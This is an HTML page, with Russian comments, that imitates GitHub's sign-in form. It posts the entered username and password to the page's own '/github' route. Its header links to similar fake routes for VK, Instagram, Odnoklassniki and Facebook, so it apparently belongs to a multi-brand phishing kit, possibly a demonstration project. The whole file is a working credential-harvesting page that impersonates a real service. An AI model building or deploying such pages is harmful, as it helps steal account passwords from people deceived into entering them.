<!DOCTYPE html>
<html>
<head>
    <title>GitHub</title>
    <!-- Подклчение таблицы стилей !-->
    <link rel="stylesheet" type="text/css" href="css/style.css">
    <!-- Подключение стилей обнуляющих во всех браузерах стандартные настройки !-->
    <link rel="stylesheet" type="text/css" href="css/nullStyle.css">
    <link rel="stylesheet" type="text/css" href="css/github.css">
    <link rel="shortcut icon" href="images/github.png" type="image/x-icon">
    <!-- Кодировка страниц !-->
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
</head>
<body>
    <!-- Хедер !-->
    	<div class="header">
		<span>Социальные сети</span>
		<div class=" aiming-vk-link vk" ><a href="/vk">Вконтакте</a></div>    
		<div class=" aiming-instagram-link instagram"><a href="/instagram">Instagram</a></div>
		<div class =" aiming-odnoclass-link odnok"> <a href="/odnoclassniki">Одноклассники</a></div>
		<div class=" aiming-facebook-link fb"><a href="/facebook">Facebook</a></div>
		<div class=" aiming-github-link git"><a href="/github">GitHub</a></div>
		<a href="/enter" class="social exit">Выход</a> 
	</div>
    
    <div class="content">
        <form action="/github" method="post">
            <img src="images/github.png" alt="github">
            <h2>Sign in to GitHub</h2>
            <div class="loginform" id="loginform">
                <h4>Username or email address</h4>
                <input type="text" name="login" class="login">
                <h4>Password</h4>
                <input type="password" name="password" class="password">
                <p></p>
                <input type="submit" name="submit" value="Sign in" class="button">
            </div>
        </form>
    </div>
</body>
</html>
